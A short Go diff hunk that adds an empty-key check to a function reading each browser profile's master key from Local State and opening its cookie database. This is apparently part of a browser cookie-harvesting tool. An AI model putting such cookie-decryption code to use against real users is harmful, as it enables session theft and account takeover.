@@ -18,6 +18,9 @@ func GetCookies(browsersList []structs.Browser) []structs.CookiesOutput {
 			path := profile.Cookies
 
 			master_key := decryption.GetMasterKey(browser.LocalState)
+			if len(master_key) == 0 {
+				continue
+			}
 			db, err := sql.Open("sqlite3", path)
 			if err != nil {
 				continue
